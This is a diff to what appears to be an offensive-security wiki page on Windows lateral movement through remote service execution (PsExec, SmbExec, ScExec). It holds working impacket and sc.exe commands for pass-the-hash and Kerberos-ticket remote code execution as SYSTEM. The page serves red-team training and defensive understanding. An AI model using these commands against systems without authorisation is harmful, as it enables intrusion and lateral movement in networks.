@@ -9,16 +9,14 @@ subLabel: (PsExec, SmbExec, ScExec)
 >
 > * Credentials (password, NT hash, Kerberos TGT) of a member of the local **Administrators** group on the target machine.
 > * Read-write SMB share access.
-> * Remote SCM via RPC enabled on the target machine (always by default).
-> * SMB share enabled on the target machine (always by default).
+> * Remote SCM RPC interface enabled the target machine (always by default).
+> * SMB share enabled on the target machine (always by default but 445/TCP might be filtered on firewall).
 
 ## Description
 
-Through the [MS-SCMR](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/705b624a-13de-43cc-b8a2-99573da3635f) (RPC) protocol, Windows allows remote communication with another machine's [Service Control Manager](https://learn.microsoft.com/pl-pl/windows/win32/services/service-control-manager) (SCM). This allows, among other things, remote startup of services. This capability ultimately allows the user to execute code on another machine (by creating a service), which is the basis for techniques like PsExec and SmbExec.
+Through the [MS-SCMR](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/705b624a-13de-43cc-b8a2-99573da3635f) (RPC) protocol, Windows allows remote communication with another machine's [Service Control Manager](https://learn.microsoft.com/pl-pl/windows/win32/services/service-control-manager) (SCM). This protocol is invoked using a named pipe `ntsvcs` via SMB `IPC$` share.
 
-PsExec and SmbExec are well-known attacks designed to establish a pseudo-interactive "shell" on the target machine. Both attacks require access to SMB share of the target host (445/TCP).
-
-It is worth remembering that remote service creation is a built-in feature of standard `sc.exe`. There is no magic here, it is a standard feature of Windows. Without SMB access, the service will execute, but we cannot provide a malicious binary to the service or receive a response. Most often, however, if remote execution of the service is possible, a read-write SMB share is also available (e.g. default `ADMIN$` or `C$` share).
+It allows, among other things, remote startup of services. This capability ultimately allows the user to execute code on another machine (by creating a service), which is the basis for techniques like PsExec and SmbExec. PsExec and SmbExec are well-known attacks designed to establish a pseudo-interactive "shell" on the target machine. Both attacks require access to SMB share of the target host (445/TCP).
 
 By default, using service execution techniques a user needs to be a **local administrator** on the target machine to remotely interact with SCM via RPC. Windows services executed by the local administrator by default run in the context of **SYSTEM user**. Logon via MS-SCMR (RPC call) is of the **Network type** (no reusable credentials).
 
@@ -37,7 +35,7 @@ impacket-psexec -hashes :$nt_hash $domain/$user@$host
 
 # Using Kerberos TGT
 export KRB5CCNAME=$tgt_ccache_file
-impacket-psexec $domain/$user@$host -k -no-pass
+impacket-psexec $hostname -k -no-pass -dc-ip $dc_ip
 ```
 
 Windows ([SysInternals - PsExec.exe](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)):
@@ -50,7 +48,7 @@ Windows ([SysInternals - PsExec.exe](https://learn.microsoft.com/en-us/sysintern
 .\PsExec.exe -accepteula -u $user \\$HOST cmd
 ```
 
-PsExec works by writing an `.exe` binary to the writable SMB share on the target host. Then, SCM is called remotely (via RPC) to execute the binary using created service. Binary creates a named pipe accessible via SMB. This named pipe is used by the user to execute commands remotely and read the output. Two-way communication is established via SMB.
+PsExec works by writing an `.exe` binary to the writable SMB share on the target host. Then, SCM is called remotely (via named pipe) to execute the binary using created service. Binary creates a named pipe accessible via SMB. This named pipe is used by the user to execute commands remotely and read the output. Two-way communication is established via SMB.
 
 > **Caveats**:
 >
@@ -70,7 +68,7 @@ impacket-smbexec -hashes :$nt_hash $domain/$user@$host
 
 # Using Kerberos TGT
 export KRB5CCNAME=$tgt_ccache_file
-impacket-smbexec $domain/$user@$host -k -no-pass
+impacket-smbexec $hostname -k -no-pass -dc-ip $dc_ip
 
 # Debug mode (shows every executed `binPath` command)
 impacket-smbexec [...] -debug
@@ -100,7 +98,7 @@ impacket-services -hashes :$nt_hash $domain/$user@$host [action]
 
 # Using Kerberos TGT
 export KRB5CCNAME=$tgt_ccache_file
-impacket-services $domain/$user@$host -k -no-pass [action]
+impacket-services $hostname -k -no-pass -dc-ip $dc_ip [action]
 
 # Actions
 list -h
@@ -124,10 +122,10 @@ sc \\$host stop $svc_name
 sc \\$host delete $svc_name
 ```
 
-{/* TODO: How to provide credentials to `sc.exe`. */}
+{/*TODO: How to provide credentials to `sc.exe`.*/}
 
 ## References
 
-* [Rift, _SMBExec: Red Side Analysis_](https://rift.stacktitan.com/smbexec/)
-* [Boitatech, _SmbExec/ScExec_](https://hacktricks.boitatech.com.br/windows/ntlm/smbexec)
-* [Ryan Hausknecht, _Offensive Lateral Movement_](https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f)
+* [Rift, *SMBExec: Red Side Analysis*](https://rift.stacktitan.com/smbexec/)
+* [Boitatech, *SmbExec/ScExec*](https://hacktricks.boitatech.com.br/windows/ntlm/smbexec)
+* [Ryan Hausknecht, *Offensive Lateral Movement*](https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f)
